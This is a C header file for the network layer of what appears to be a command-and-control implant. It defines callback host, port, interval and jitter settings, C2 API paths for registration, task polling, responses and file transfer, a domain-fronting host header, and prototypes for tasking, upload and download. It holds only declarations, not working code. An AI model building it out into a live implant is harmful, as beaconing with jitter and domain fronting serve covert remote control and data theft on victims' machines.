

#ifndef COMMS_H_
#define COMMS_H_
/* includes */
#include <sys/socket.h> /* socket, connect */
#include <netinet/in.h> /* struct sockaddr_in, struct sockaddr */
#include <arpa/inet.h>
#include <stdio.h> /* printf, sprintf */
#include <stdlib.h> /* exit */
#include <unistd.h> /* read, write, close */
#include <string.h> /* memcpy, memset */
#include <netdb.h> /* struct hostent, gethostbyname */
#include "cJSON.h"
#include "utils.h"
/* includes for ssl */
#include <openssl/ssl.h>
#include <openssl/err.h>
/* defines */
extern char* CALLBACK_HOST;
extern unsigned int CALLBACK_PORT;
extern unsigned int CALLBACK_INTERVAL;
extern unsigned int CALLBACK_JITTER;
/* api format strings */
#define API_REGISTER_CALLBACK "\"callback_host:callback_port/api/v1.2/callbacks/\"" //potentially replace this when compiling
#define API_GET_NEXT_TASK_FORMAT "\"callback_host:callback_port/api/v1.2/tasks/callback/%d/nextTask\""
#define API_POST_RESPONSE "\"callback_host:callback_port/api/v1.2/responses/%d\""
#define API_GET_FILE "\"callback_host:callback_port/api/v1.2/files/%d/callbacks/%d\""
#define HTTP_POST "POST %s HTTP/1.1\r\n"
#define HTTP_GET "GET %s HTTP/1.1\r\n"
#define HOST_HEADER "domain_front"
#define JSON_HEADERS_POST "Host: %s\r\nContent-Length: %d\r\nContent-Type: application/json\r\n\r\n"
#define JSON_HEADERS_GET "Host: %s\r\nAccept: application/json\r\n\r\n"
#define JSON_DATA "%s\r\n\r\n"

/* function prototypes */
void initial_callback(); //updates global_info structure
void get_tasking(); //updates global_info structure
cJSON* get_JSON(char*, int);
cJSON* post_JSON(char*, cJSON*, int);
cJSON* post_response(cJSON* json);
int setup_connection(char * host, int port);
void close_connection(int sockfd);
int c2_upload(unsigned int file_id, unsigned char** file_buffer, unsigned int * final_length);
int c2_download(FILE* fptr, unsigned int size, unsigned int task_id);


#endif /* COMMS_H_ */
